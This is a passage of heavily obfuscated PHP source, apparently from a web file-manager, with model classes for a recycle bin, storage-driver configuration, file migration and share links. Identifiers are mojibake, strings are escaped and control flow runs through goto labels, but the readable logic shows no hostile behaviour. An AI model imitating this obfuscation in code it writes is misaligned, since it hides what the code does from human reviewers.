($this->findByName($·ñÇïô‚)) { return !1; } $ì–”Šú¯ = array($ªİí¾Œğ[428] => $·ñÇïô‚, $ªİí¾Œğ[493] => $«¤Ê±Õè, $ªİí¾Œğ[1841] => $this->getSort($ªİí¾Œğ[267]) + 1); return parent::insert($ì–”Šú¯); } public function update($ŒÀŸ¡§ó, $íİ¼Î°) { $Ğä–í¨ =& $_SERVER[™¾ÇÙ¯¹]; $‹­¢ùÍ = $this->listData($ŒÀŸ¡§ó); $ÓÕ²Ú¤ª = $this->findByName($íİ¼Î°[$Ğä–í¨[32]]); if (!$‹­¢ùÍ || $ÓÕ²Ú¤ª && $ÓÕ²Ú¤ª[$Ğä–í¨[407]] != $‹­¢ùÍ[$Ğä–í¨[407]]) { return !1; } return parent::update($ŒÀŸ¡§ó, $íİ¼Î°); } public function moveTop($ù‘¯Ğåƒ) { $øı°Ù×ö =& $_SERVER[™¾ÇÙ¯¹]; $˜ÄÕéŸÓ = parent::listData(); $ã©ªŞµ = $this->getSort($øı°Ù×ö[266]); foreach ($˜ÄÕéŸÓ as &$¨Ä·Ğ­) { if ($¨Ä·Ğ­[$øı°Ù×ö[407]] == $ù‘¯Ğåƒ) { $¨Ä·Ğ­[$øı°Ù×ö[1861]] = $ã©ªŞµ; continue; } $¨Ä·Ğ­[$øı°Ù×ö[1861]] += 1; } unset($¨Ä·Ğ­); return parent::resetData($˜ÄÕéŸÓ); } public function moveBottom($õ–Ãƒñ) { $Ğ²±Ôå =& $_SERVER[™¾ÇÙ¯¹]; $…úÅ©¤î = $this->getSort($Ğ²±Ôå[267]) + 1; return parent::update($õ–Ãƒñ, array($Ğ²±Ôå[1861] => $…úÅ©¤î)); } public function resetSort($âà°¼›Ú) { $Î¶²¸İª =& $_SERVER[™¾ÇÙ¯¹]; $Ë†àòµ± = array(); $âà°¼›Ú = is_array($âà°¼›Ú) ? $âà°¼›Ú : array(); for ($»ÆÌå¢À = 0; $»ÆÌå¢À < count($âà°¼›Ú); $»ÆÌå¢À++) { $Ë†àòµ±[$âà°¼›Ú[$»ÆÌå¢À] . $Î¶²¸İª[12]] = $»ÆÌå¢À + 1; } $şÚ¨¤ÙÄ = parent::listData(); foreach ($şÚ¨¤ÙÄ as &$”¸ˆ©æ²) { $¹ç–¶Ûş = $Ë†àòµ±[$”¸ˆ©æ²[$Î¶²¸İª[407]]]; $”¸ˆ©æ²[$Î¶²¸İª[1861]] = $¹ç–¶Ûş ? $¹ç–¶Ûş : $”¸ˆ©æ²[$Î¶²¸İª[1861]]; } unset($”¸ˆ©æ²); return parent::resetData($şÚ¨¤ÙÄ); } private function getSort($˜şÈ¬«ú) { $ù†ìÙ® =& $_SERVER[™¾ÇÙ¯¹]; $ï³‰ŠÕ± = parent::listData(); $ú“»¤¬ê = array_to_keyvalue($ï³‰ŠÕ±, $ù†ìÙ®[12], $ù†ìÙ®[1861]); if (!$ú“»¤¬ê) { $ú“»¤¬ê = array(0); } $Ş®²¥• = $˜şÈ¬«ú == $ù†ìÙ®[267] ? max($ú“»¤¬ê) : min($ú“»¤¬ê); return intval($Ş®²¥•); } } goto EÙå­º¼¤; dÈôˆàèĞ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\x63\x65\x5f\162\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\x69\156\163\145\x72\164", "\146\x75\x6e\x63\x74\x69\x6f\156")); public function listData($œøÖ™—ş = false) { $øÀĞş =& $_SERVER[™¾ÇÙ¯¹]; $œøÖ™—ş = $œøÖ™—ş ? $œøÖ™—ş : USER_ID; $Œìİö¡¤ = $this->where(array($øÀĞş[1656] => $œøÖ™—ş))->select(); return array_to_keyvalue($Œìİö¡¤, $øÀĞş[12], $øÀĞş[410]); } public function moveToRecycle($¹Ú¬ˆÏĞ) { $·ª­‰÷Î =& $_SERVER[™¾ÇÙ¯¹]; $ÇÃÙÊ Ù = Model($·ª­‰÷Î[1335]); $¿¿â­ü” = $ÇÃÙÊ Ù->sourceInfo($¹Ú¬ˆÏĞ); if (!$¿¿â­ü” || $¿¿â­ü”[$·ª­‰÷Î[439]] == $·ª­‰÷Î[88]) { return; } $†¦§«Í = array($·ª­‰÷Î[425] => $¹Ú¬ˆÏĞ, $·ª­‰÷Î[1656] => USER_ID, $·ª­‰÷Î[594] => $¿¿â­ü”[$·ª­‰÷Î[419]], $·ª­‰÷Î[595] => $¿¿â­ü”[$·ª­‰÷Î[513]], $·ª­‰÷Î[598] => $¿¿â­ü”[$·ª­‰÷Î[529]]); $this->add($†¦§«Í); $this->recycleMove($¹Ú¬ˆÏĞ, 1); if ($¿¿â­ü”[$·ª­‰÷Î[418]] == $·ª­‰÷Î[88]) { $ãÏ·œ¯ë = array($·ª­‰÷Î[598] => array($·ª­‰÷Î[558], $¿¿â­ü”[$·ª­‰÷Î[529]] . $¹Ú¬ˆÏĞ . $·ª­‰÷Î[559])); $ÇÃÙÊ Ù->where($ãÏ·œ¯ë)->setField($·ª­‰÷Î[439], 1); } } public function clear() { $this->remove(!1); } public function remove($ŒíÛî¯ = false, $³¡Ó¨ˆˆ = false) { $˜õ£´ş =& $_SERVER[™¾ÇÙ¯¹]; $³¡Ó¨ˆˆ = $³¡Ó¨ˆˆ ? $³¡Ó¨ˆˆ : USER_ID; $‹Å•«‘Ü = Model($˜õ£´ş[1335]); $›ÀÑ¸²¢ = $this->listData($³¡Ó¨ˆˆ); $ŒíÛî¯ = $ŒíÛî¯ === !1 ? !1 : $ŒíÛî¯; $ÄŞ«úÔĞ = array(); foreach ($›ÀÑ¸²¢ as $ì©Ü”€¾) { if ($ŒíÛî¯ != !1 && !in_array($ì©Ü”€¾, $ŒíÛî¯)) { continue; } $ü¿„Â±• = $‹Å•«‘Ü->sourceInfo($ì©Ü”€¾); $‹Å•«‘Ü->remove($ì©Ü”€¾, !1); $ü½¯‘èÀ = $ü¿„Â±•[$˜õ£´ş[419]] . $˜õ£´ş[11] . $ü¿„Â±•[$˜õ£´ş[513]]; $ÄŞ«úÔĞ[$ü½¯‘èÀ] = array($˜õ£´ş[594] => $ü¿„Â±•[$˜õ£´ş[419]], $˜õ£´ş[513] => $ü¿„Â±•[$˜õ£´ş[513]]); $this->where(array($˜õ£´ş[410] => $ì©Ü”€¾))->delete(); } foreach ($ÄŞ«úÔĞ as $Ø—î©Œ¦) { $‹Å•«‘Ü->targetSpaceUpdate($Ø—î©Œ¦[$˜õ£´ş[419]], $Ø—î©Œ¦[$˜õ£´ş[513]]); } } public function restore($†—óù = false) { $ˆˆ§¬Õ = $this->listData(); $this->_restoreSource($ˆˆ§¬Õ, $†—óù); } public function removeUserAll($÷ÃÁúˆÔ) { $this->remove(!1, $÷ÃÁúˆÔ); } private function _restoreSource($µáÜÌÓî, $ùºÔäê¶) { $üÄíÌĞ‰ =& $_SERVER[™¾ÇÙ¯¹]; $Š÷’¢ì = Model($üÄíÌĞ‰[1335]); $ùºÔäê¶ = $ùºÔäê¶ == !1 ? !1 : $ùºÔäê¶; if (!$µáÜÌÓî) { return !0; } $ÍòŞÂÍ = array(); foreach ($µáÜÌÓî as $è¥–²¼ì) { if ($ùºÔäê¶ != !1 && !in_array($è¥–²¼ì, $ùºÔäê¶)) { continue; } $Å¾‰¦­Å = $Š÷’¢ì->sourceInfo($è¥–²¼ì); $¡¦˜´œğ = $Š÷’¢ì->sourceInfo($Å¾‰¦­Å[$üÄíÌĞ‰[440]]); if ($¡¦˜´œğ[$üÄíÌĞ‰[439]] == $üÄíÌĞ‰[88]) { continue; } $Š÷’¢ì->lockMoveStart($è¥–²¼ì); $this->recycleMove($è¥–²¼ì, 0); if ($Å¾‰¦­Å[$üÄíÌĞ‰[418]] == $üÄíÌĞ‰[88]) { $“Üİ™ìè = array($üÄíÌĞ‰[598] => array($üÄíÌĞ‰[558], $Å¾‰¦­Å[$üÄíÌĞ‰[529]] . $è¥–²¼ì . $üÄíÌĞ‰[559])); $Š÷’¢ì->where($“Üİ™ìè)->setField($üÄíÌĞ‰[439], 0); $this->restoreFolderChildren($è¥–²¼ì, $µáÜÌÓî); } $this->where(array($üÄíÌĞ‰[410] => $è¥–²¼ì))->delete(); $Š÷’¢ì->folderSizeReset($Å¾‰¦­Å[$üÄíÌĞ‰[440]]); $ÍòŞÂÍ[] = $Å¾‰¦­Å[$üÄíÌĞ‰[440]]; if ($Å¾‰¦­Å[$üÄíÌĞ‰[418]] == $üÄíÌĞ‰[88]) { $ÍòŞÂÍ[] = $è¥–²¼ì; } $Š÷’¢ì->lockMoveEnd($è¥–²¼ì); } $Š÷’¢ì->updateModifyTime($ÍòŞÂÍ); } private function restoreFolderChildren($©Ğşãâ, $Œ²Õî…º) { $ûç«á¦„ =& $_SERVER[™¾ÇÙ¯¹]; $ë…„óú = Model($ûç«á¦„[1335]); $ïáùõèÇ = array($ûç«á¦„[410] => array($ûç«á¦„[7], array())); foreach ($Œ²Õî…º as $¥±•ßäˆ) { if ($¥±•ßäˆ == $©Ğşãâ) { continue; } if (!$ë…„óú->isParentOf($©Ğşãâ, $¥±•ßäˆ)) { continue; } $Ÿ—ä¯éÓ = $ë…„óú->sourceInfo($¥±•ßäˆ); if ($Ÿ—ä¯éÓ[$ûç«á¦„[418]] == $ûç«á¦„[88]) { $ïáùõèÇ[] = array($ûç«á¦„[598] => array($ûç«á¦„[558], $Ÿ—ä¯éÓ[$ûç«á¦„[529]] . $¥±•ßäˆ . $ûç«á¦„[559])); } else { $ïáùõèÇ[$ûç«á¦„[410]][1][] = $¥±•ßäˆ; } } if (!$ïáùõèÇ[$ûç«á¦„[410]][1]) { unset($ïáùõèÇ[$ûç«á¦„[410]]); } if (!$ïáùõèÇ) { return; } $ïáùõèÇ[$ûç«á¦„[410]][1] = array_unique($ïáùõèÇ[$ûç«á¦„[410]][1]); $ïáùõèÇ[$ûç«á¦„[1008]] = $ûç«á¦„[1935]; $ë…„óú->where($ïáùõèÇ)->setField($ûç«á¦„[439], 1); } private function recycleMove($Áá‚ß§™, $²Ú§É¸à = 1) { $È‹äşÙ­ =& $_SERVER[™¾ÇÙ¯¹]; $Õ­¤×ê = Model($È‹äşÙ­[1335]); $ù ‹µãÎ = Model($È‹äşÙ­[2148]); $¡‡î¡õİ = array($È‹äşÙ­[410] => $Áá‚ß§™); if ($²Ú§É¸à) { $Õ­¤×ê->where($¡‡î¡õİ)->setField($È‹äşÙ­[439], 1); $ù ‹µãÎ->eventRecycle($Áá‚ß§™, $È‹äşÙ­[2149]); } else { $«²‘Éèº = $Õ­¤×ê->where($¡‡î¡õİ)->find(); $×™ÇÒÅ = $«²‘Éèº[$È‹äşÙ­[418]] == $È‹äşÙ­[88]; $ü†Šè€¯ = $Õ­¤×ê->fileNameAuto($«²‘Éèº[$È‹äşÙ­[440]], $«²‘Éèº[$È‹äşÙ­[32]], REPEAT_RENAME_FOLDER, $×™ÇÒÅ); if ($ü†Šè€¯ != $«²‘Éèº[$È‹äşÙ­[32]]) { $Õ­¤×ê->rename($Áá‚ß§™, $ü†Šè€¯); } $Õ­¤×ê->where($¡‡î¡õİ)->setField($È‹äşÙ­[439], 0); $ù ‹µãÎ->eventRecycle($Áá‚ß§™, $È‹äşÙ­[2150]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x73\x6f\165\x72\143\x65\x53\x65\143\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\x6f\x75\162\x63\145\111\104", "\x74\x79\x70\x65\111\104", "\x63\x72\145\141\164\145\x55\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\x73\x74\x6f\162\x61\x67\x65\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\163\151\x7a\145\x4d\x61\170", "\163\x79\163\164\145\x6d", "\144\x65\146\x61\x75\154\164", "\144\162\x69\166\145\x72", "\143\157\x6e\146\151\x67"); public function listData($¼·‹­üÚ = false, $ëß‰†¨º = "\155\157\x64\x69\x66\x79\x54\x69\x6d\145", $€£Šàá¿ = false) { $šà‰Î¢ =& $_SERVER[™¾ÇÙ¯¹]; $Ö¹èÔ£ç = parent::listData($¼·‹­üÚ, $ëß‰†¨º, $€£Šàá¿); if ($¼·‹­üÚ) { return $Ö¹èÔ£ç; } $éÄ…ä‚ñ = $this->ioSizeUseGet(array_to_keyvalue($Ö¹èÔ£ç, $šà‰Î¢[12], $šà‰Î¢[407])); foreach ($Ö¹èÔ£ç as $µÑâåƒ‚ => $­å¤ç¾ï) { unset($Ö¹èÔ£ç[$µÑâåƒ‚][$šà‰Î¢[6]]); $Ö¹èÔ£ç[$µÑâåƒ‚][$šà‰Î¢[1826]] = isset($éÄ…ä‚ñ[$­å¤ç¾ï[$šà‰Î¢[407]]]) ? $éÄ…ä‚ñ[$­å¤ç¾ï[$šà‰Î¢[407]]] : 0; } return $Ö¹èÔ£ç; } public function ioSizeUseGet($Í¸»âı) { $Ê•ÙøÛÍ =& $_SERVER[™¾ÇÙ¯¹]; if (!$Í¸»âı) { return array(); } $­ªŸ¼ÙÀ = $Ê•ÙøÛÍ[2151] . implode($Ê•ÙøÛÍ[50], $Í¸»âı); $Ãº² ·Ä = Cache::get($­ªŸ¼ÙÀ); if ($Ãº² ·Ä) { return $Ãº² ·Ä; } $š·÷í€Ù = array($Ê•ÙøÛÍ[832] => $Ê•ÙøÛÍ[407], $Ê•ÙøÛÍ[2152] => $Ê•ÙøÛÍ[76]); $¾Üıó‘± = array($Ê•ÙøÛÍ[832] => array($Ê•ÙøÛÍ[7], $Í¸»âı)); $Ãº² ·Ä = Model($Ê•ÙøÛÍ[804])->field($š·÷í€Ù)->where($¾Üıó‘±)->group($Ê•ÙøÛÍ[832])->select(); $Ãº² ·Ä = array_to_keyvalue($Ãº² ·Ä, $Ê•ÙøÛÍ[407], $Ê•ÙøÛÍ[76]); Cache::set($­ªŸ¼ÙÀ, $Ãº² ·Ä, 600); return $Ãº² ·Ä; } public function getConfig($ãŠ«Ş•¹) { $éóá€¥– = parent::listData($ãŠ«Ş•¹); return json_decode($éóá€¥–[$_SERVER[™¾ÇÙ¯¹][6]], !0); } public function update($˜ĞÇÈÕ, $… ¤Á† ) { $‹Áø·³ =& $_SERVER[™¾ÇÙ¯¹]; $Òæöû¯ì = $… ¤Á† [$‹Áø·³[32]]; $ĞËô¡ã‡ = array_to_keyvalue(parent::listData(), $‹Áø·³[32]); if (isset($ĞËô¡ã‡[$Òæöû¯ì]) && $ĞËô¡ã‡[$Òæöû¯ì][$‹Áø·³[407]] != $˜ĞÇÈÕ) { return !1; } if (!empty($… ¤Á† [$‹Áø·³[6]])) { $„Ù“‹ş = json_decode($… ¤Á† [$‹Áø·³[6]], !0); $äîˆõÀÍ = isset($„Ù“‹ş[$‹Áø·³[2153]]) ? $‹Áø·³[2153] : (isset($„Ù“‹ş[$‹Áø·³[2154]]) ? $‹Áø·³[2154] : $‹Áø·³[12]); if ($äîˆõÀÍ) { $Ò©¬µ©° = $this->getConfig($˜ĞÇÈÕ); $‘ıì‰ = $Ò©¬µ©°[$äîˆõÀÍ]; $©Áô—Ë = $„Ù“‹ş[$äîˆõÀÍ]; if ($©Áô—Ë == str_repeat($‹Áø·³[188], strlen($‘ıì‰))) { $„Ù“‹ş[$äîˆõÀÍ] = $‘ıì‰; } else { if ($©Áô—Ë != $‘ıì‰) { $… ¤Á† [$‹Áø·³[2155]] = $‹Áø·³[88]; } } } } if (isset($… ¤Á† [$‹Áø·³[2155]]) && $… ¤Á† [$‹Áø·³[2155]] == $‹Áø·³[88]) { $this->checkConfig($… ¤Á† ); } unset($… ¤Á† [$‹Áø·³[2155]]); $¥ê™Ë®æ = parent::update($˜ĞÇÈÕ, $… ¤Á† ); if ($¥ê™Ë®æ && $… ¤Á† [$‹Áø·³[37]]) { $êÖ”ú™Ø = 0; foreach ($ĞËô¡ã‡ as $÷æŞ‡æâ) { if ($÷æŞ‡æâ[$‹Áø·³[37]] && $÷æŞ‡æâ[$‹Áø·³[407]] != $˜ĞÇÈÕ) { $êÖ”ú™Ø = $÷æŞ‡æâ[$‹Áø·³[407]]; parent::update($÷æŞ‡æâ[$‹Áø·³[407]], array($‹Áø·³[37] => 0)); } } $this->updateBackup($˜ĞÇÈÕ, $êÖ”ú™Ø); } return $¥ê™Ë®æ; } public function add($Œö•Û³¸) { $§ªë‹ê =& $_SERVER[™¾ÇÙ¯¹]; $™è”åšò = array_to_keyvalue(parent::listData(), $§ªë‹ê[32]); if (isset($™è”åšò[$Œö•Û³¸[$§ªë‹ê[32]]])) { return !1; } $this->checkConfig($Œö•Û³¸); $Ùá´Â›Ó = parent::insert($Œö•Û³¸); if ($Ùá´Â›Ó && $Œö•Û³¸[$§ªë‹ê[37]]) { foreach ($™è”åšò as $íŞ°Ëİ) { if ($íŞ°Ëİ[$§ªë‹ê[37]]) { parent::update($íŞ°Ëİ[$§ªë‹ê[407]], array($§ªë‹ê[37] => 0)); } } } return $Ùá´Â›Ó; } public function updateBackup($ˆûùëÍ¬, $©Ü€ñ•) { $¼áò×Ìè =& $_SERVER[™¾ÇÙ¯¹]; if (!$©Ü€ñ•) { return; } $ƒ¯˜ıİ = Model($¼áò×Ìè[764])->config(); if ($ƒ¯˜ıİ[$¼áò×Ìè[1635]] != $¼áò×Ìè[88] || $ƒ¯˜ıİ[$¼áò×Ìè[767]] != $©Ü€ñ•) { return; } $Çß°¨ğ‚ = Model($¼áò×Ìè[785])->get($¼áò×Ìè[795]); $Çß°¨ğ‚ = json_decode($Çß°¨ğ‚, !0); if (!$Çß°¨ğ‚) { return; } $Çß°¨ğ‚[$¼áò×Ìè[767]] = $ˆûùëÍ¬; Model($¼áò×Ìè[785])->set(array($¼áò×Ìè[795] => $Çß°¨ğ‚)); } public function checkConfig(&$Ãäüª´, $’è–×à× = false) { $ş¿Ÿ„êµ =& $_SERVER[™¾ÇÙ¯¹]; $şÌ¦©øô = strtolower($Ãäüª´[$ş¿Ÿ„êµ[95]]); $ÉšÇ¸ÌÑ = json_decode($Ãäüª´[$ş¿Ÿ„êµ[6]], !0); foreach ($ÉšÇ¸ÌÑ as $ôÈêıÖ => $™ê•íÄï) { $ÉšÇ¸ÌÑ[$ôÈêıÖ] = trim($™ê•íÄï); } $ÉšÇ¸ÌÑ[$ş¿Ÿ„êµ[2156]] = rand_string(6); $‘½İ‰‹ = $GLOBALS[$ş¿Ÿ„êµ[6]][$ş¿Ÿ„êµ[89]][$ş¿Ÿ„êµ[841]]; $üµÇôã‡ = isset($‘½İ‰‹[$şÌ¦©øô]) ? $‘½İ‰‹[$şÌ¦©øô] : ucfirst($şÌ¦©øô); $Çñô ğæ = $ş¿Ÿ„êµ[74] . $üµÇôã‡; if (!$üµÇôã‡ || !class_exists($Çñô ğæ)) { if ($’è–×à×) { return LNG($ş¿Ÿ„êµ[2157]); } write_log(array($ş¿Ÿ„êµ[2158], $Ãäüª´, get_caller_info()), $ş¿Ÿ„êµ[2159]); show_json(LNG($ş¿Ÿ„êµ[2157]), !1, $Ãäüª´); } $ÕíÉ·«– = new $Çñô ğæ($ÉšÇ¸ÌÑ); if (in_array($şÌ¦©øô, $ÕíÉ·«–->objectDriver)) { if (!$ÕíÉ·«–->isBucketCors() && !$ÕíÉ·«–->setBucketCors()) { $àåÂ°°¼ = LNG($ş¿Ÿ„êµ[2160]); $àåÂ°°¼ .= $ş¿Ÿ„êµ[2161] . LNG($ş¿Ÿ„êµ[2162]); if ($’è–×à×) { return $àåÂ°°¼; } show_json($àåÂ°°¼, !1); } } $ÑÍå„˜† = rtrim($ÉšÇ¸ÌÑ[$ş¿Ÿ„êµ[1189]], $ş¿Ÿ„êµ[8]) . $ş¿Ÿ„êµ[8]; $Û¿î—˜· = $ÕíÉ·«–->getPath($ÑÍå„˜† . $ş¿Ÿ„êµ[1251]); if (!$ÕíÉ·«–->mkfile($Û¿î—˜·)) { if ($’è–×à×) { return LNG($ş¿Ÿ„êµ[2160]); } show_json(LNG($ş¿Ÿ„êµ[2160]), !1); } $ÉšÇ¸ÌÑ[$ş¿Ÿ„êµ[1189]] = $ÑÍå„˜†; $Ãäüª´[$ş¿Ÿ„êµ[6]] = json_encode($ÉšÇ¸ÌÑ); $Ãäüª´[$ş¿Ÿ„êµ[95]] = $üµÇôã‡; return !0; } public function driverListSystem() { $ç¼šªô€ =& $_SERVER[™¾ÇÙ¯¹]; $ÛøÀèü£ = parent::listData(); $»µşû·² = array(); foreach ($ÛøÀèü£ as $‡²›¿š™) { unset($‡²›¿š™[$ç¼šªô€[200]], $‡²›¿š™[$ç¼šªô€[85]]); $‡²›¿š™[$ç¼šªô€[6]] = json_decode($‡²›¿š™[$ç¼šªô€[6]], !0); $»µşû·²[] = $‡²›¿š™; } return $»µşû·²; } public function defaultDriver() { $‡ŠÓÙ£ =& $_SERVER[™¾ÇÙ¯¹]; $‡ñÑƒİŒ = parent::listData(); $­¿áãÄ = array_filter_by_field($‡ñÑƒİŒ, $‡ŠÓÙ£[37], 1); $­¿áãÄ = $­¿áãÄ[0]; if ($­¿áãÄ) { $­¿áãÄ[$‡ŠÓÙ£[6]] = json_decode($­¿áãÄ[$‡ŠÓÙ£[6]], !0); } return $­¿áãÄ; } public function driverInfo($ªÕåÔÕø) { $·ÄïÉÔ =& $_SERVER[™¾ÇÙ¯¹]; $íÃÆóÏ¯ = array_to_keyvalue(parent::listData(), $·ÄïÉÔ[407]); if (!isset($íÃÆóÏ¯[$ªÕåÔÕø])) { return !1; } $»áÉ¯ö¨ = $íÃÆóÏ¯[$ªÕåÔÕø]; $»áÉ¯ö¨[$·ÄïÉÔ[6]] = json_decode($»áÉ¯ö¨[$·ÄïÉÔ[6]], !0); return $»áÉ¯ö¨; } public function remove($ô ˆ¨×ˆ) { $this->removeShareItems($ô ˆ¨×ˆ); return parent::remove($ô ˆ¨×ˆ); } public function removeWithFile($òØ³¦ÚÅ, $ÏÔÜû§ı) { $È»‡Ô²í =& $_SERVER[™¾ÇÙ¯¹]; $Áã¸öÈá = array($È»‡Ô²í[832] => $òØ³¦ÚÅ); $ùÚøò• = Model($È»‡Ô²í[479])->where($Áã¸öÈá)->count(); $ƒ† ¶Õ = Model($È»‡Ô²í[479])->where($Áã¸öÈá)->sum($È»‡Ô²í[76]); $£”ÛàÀ = $ÏÔÜû§ı . $È»‡Ô²í[2163] . $òØ³¦ÚÅ; $¡¶·Ÿ£ = LNG($ÏÔÜû§ı == $È»‡Ô²í[565] ? $È»‡Ô²í[2164] : $È»‡Ô²í[2165]); $é‹§œ›¬ = new TaskFileTransfer($£”ÛàÀ, $È»‡Ô²í[2159], $ùÚøò•, $¡¶·Ÿ£ . "\50{$òØ³¦ÚÅ}\51"); $é‹§œ›¬->task[$È»‡Ô²í[778]] = (double) $ƒ† ¶Õ; $¬„°ßÁè = KodIO::defaultDriver(); $Şıëàúş = $¬„°ßÁè[$È»‡Ô²í[407]]; $İü¦Ùı  = "\x7b\151\157\72{$Şıëàúş}\x7d\57"; $Ï¦ã˜”½ = !0; $úÛ˜â¦Ü = array(); $ƒÄ™è…Ä = Model($È»‡Ô²í[199])->where($Áã¸öÈá)->field($È»‡Ô²í[2166])->select(); foreach ($ƒÄ™è…Ä as $­Šã¨­) { $´Æ«éÔ = $­Šã¨­[$È»‡Ô²í[84]]; $æ™ãÂÂï = $İü¦Ùı  . str_replace("\x7b\151\x6f\x3a{$òØ³¦ÚÅ}\175\x2f", $È»‡Ô²í[12], $´Æ«éÔ); if (!IO::exist($´Æ«éÔ)) { $úÛ˜â¦Ü[] = $­Šã¨­[$È»‡Ô²í[476]]; $é‹§œ›¬->updateFileEnd($­Šã¨­[$È»‡Ô²í[32]], $­Šã¨­[$È»‡Ô²í[76]]); continue; } if (IO::exist($æ™ãÂÂï)) { $é‹§œ›¬->updateFileEnd($­Šã¨­[$È»‡Ô²í[32]], $­Šã¨­[$È»‡Ô²í[76]]); continue; } if (!IO::move($´Æ«éÔ, get_path_father($æ™ãÂÂï))) { $Ï¦ã˜”½ = !1; break; } $Áã¸öÈá = array($È»‡Ô²í[476] => $­Šã¨­[$È»‡Ô²í[476]]); $üùñ®’ = array($È»‡Ô²í[832] => $Şıëàúş, $È»‡Ô²í[84] => $æ™ãÂÂï); Model($È»‡Ô²í[199])->where($Áã¸öÈá)->save($üùñ®’); } $this->removeByFileID($úÛ˜â¦Ü); if (!$Ï¦ã˜”½) { $é‹§œ›¬->stop($£”ÛàÀ); return !1; } $é‹§œ›¬->end(); if ($ÏÔÜû§ı == $È»‡Ô²í[1806]) { $this->remove($òØ³¦ÚÅ); } } public function progress($·´åÅı», $ ÁŠó£¸) { return Task::get($ ÁŠó£¸ . $_SERVER[™¾ÇÙ¯¹][2163] . $·´åÅı»); } private function removeByFileID($¹úï¬Ÿ = array()) { $·ÀıÄº³ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($¹úï¬Ÿ)) { return; } $»Âà â¾ = array($·ÀıÄº³[476] => array($·ÀıÄº³[7], $¹úï¬Ÿ)); $«ó»¾ÜÏ = Model($·ÀıÄº³[1335])->where($»Âà â¾)->field($·ÀıÄº³[410])->select(); if (!$«ó»¾ÜÏ) { return; } $«ó»¾ÜÏ = array_to_keyvalue($«ó»¾ÜÏ, $·ÀıÄº³[12], $·ÀıÄº³[410]); foreach ($«ó»¾ÜÏ as $‡óĞ ×à) { Model($·ÀıÄº³[424])->removeNow($‡óĞ ×à, !1); } } private function removeShareItems($¼“¹Ãïı) { $÷·Ê„úî =& $_SERVER[™¾ÇÙ¯¹]; $ öİº¹¨ = "\173\151\157\x3a{$¼“¹Ãïı}\x7d\x2f"; $é¹áòÃÔ = array($÷·Ê„úî[410] => 0, $÷·Ê„úî[1184] => array($÷·Ê„úî[391], "{$ öİº¹¨}\45")); $¥²ûÔÖ = Model($÷·Ê„úî[1817])->where($é¹áòÃÔ)->field($÷·Ê„úî[497])->select(); if (empty($¥²ûÔÖ)) { return; } $ëªœ¢ = array_to_keyvalue($¥²ûÔÖ, $÷·Ê„úî[12], $÷·Ê„úî[497]); Model($÷·Ê„úî[609])->remove($ëªœ¢); } } goto D–™–Ù·÷; EŒ’Šå·”Ô: define($_SERVER[™¾ÇÙ¯¹][238], 1); define($_SERVER[™¾ÇÙ¯¹][239], 2); define($_SERVER[™¾ÇÙ¯¹][240], 3); goto e¹¹ÒºÉ³®; a¤Ò‰Éò‘: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ãÛ‡èğ·) { $this->pathParse = $ãÛ‡èğ·; $this->model = Model($_SERVER[™¾ÇÙ¯¹][1335]); } public function getPathOuter($¸ÀŠÎÒ¬) { $ÈÛ÷š¯ =& $_SERVER[™¾ÇÙ¯¹]; if (!$¸ÀŠÎÒ¬) { return $¸ÀŠÎÒ¬; } $íëÁäô® = $this->parse($¸ÀŠÎÒ¬); return trim(KodIO::makeShare($this->pathParse[$ÈÛ÷š¯[407]], $íëÁäô®[$ÈÛ÷š¯[407]]), $ÈÛ÷š¯[8]); } protected function infoParse($³ÜÁçş, $·­Ëï¸ = false, $Ô†˜¦ß÷ = false) { $ÖÊ‚ğçä =& $_SERVER[™¾ÇÙ¯¹]; $Õ•âëù = $this->pathParse[$ÖÊ‚ğçä[407]]; $‚úøªªÁ = trim($this->pathParse[$ÖÊ‚ğçä[1177]], $ÖÊ‚ğçä[8]); return Action($ÖÊ‚ğçä[1343])->sharePathInfo($Õ•âëù, $‚úøªªÁ, $·­Ëï¸); } public function infoFull($’ÉêÛç¯) { $Ò®Ï¿œ® =& $_SERVER[™¾ÇÙ¯¹]; $§£Ş†‹ğ = explode($Ò®Ï¿œ®[8], trim($’ÉêÛç¯, $Ò®Ï¿œ®[8])); if (count($§£Ş†‹ğ) > 1) { $Ù¼¡¤´‰ = implode($Ò®Ï¿œ®[8], array_splice($§£Ş†‹ğ, 1)); $Ñª‚ƒçÛ = $this->model->pathInfoByPath($§£Ş†‹ğ[0], $Ù¼¡¤´‰); if (!$Ñª‚ƒçÛ) { return !1; } $this->pathParse[$Ò®Ï¿œ®[1177]] = $Ñª‚ƒçÛ[$Ò®Ï¿œ®[410]]; } return $this->infoParse($’ÉêÛç¯); } public function listAll($³ĞõÓöò) { $üªî‡áº =& $_SERVER[™¾ÇÙ¯¹]; $¯ªğƒí = IO::info($this->pathParse[$üªî‡áº[84]]); if (!$¯ªğƒí) { return array(); } $²—Íº¼Ê = $this->model->listAll($³ĞõÓöò); $ƒ¢Ïıßú = Model($üªî‡áº[609])->getInfo($¯ªğƒí[$üªî‡áº[497]]); $òàã²–¸ = Action($üªî‡áº[1343]); foreach ($²—Íº¼Ê as &$õÂÂÄş–) { check_abort(); $õÂÂÄş–[$üªî‡áº[86]] = $òàã²–¸->_shareItemeParse($õÂÂÄş–[$üªî‡áº[86]], $ƒ¢Ïıßú); } unset($õÂÂÄş–); return $²—Íº¼Ê; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ĞÄ›¹ïÏ) { $this->pathParse = $ĞÄ›¹ïÏ; $this->model = Model($_SERVER[™¾ÇÙ¯¹][1335]); } protected function infoParse($ËÇÄ½··, $–…£®‡Å = false, $½åÄÔ‹¹ = false) { $××âß¡¾ =& $_SERVER[™¾ÇÙ¯¹]; return Action($××âß¡¾[1183])->sharePathInfo($this->pathParse[$××âß¡¾[84]], !0, $–…£®‡Å); } public function listPath($ÈË§¬Â½, $ğÎ“Òã = false) { $®ıô—½¤ =& $_SERVER[™¾ÇÙ¯¹]; $èöÕúÜ× = parent::listPath($ÈË§¬Â½, $ğÎ“Òã); if (!$èöÕúÜ×) { return $èöÕúÜ×; } if 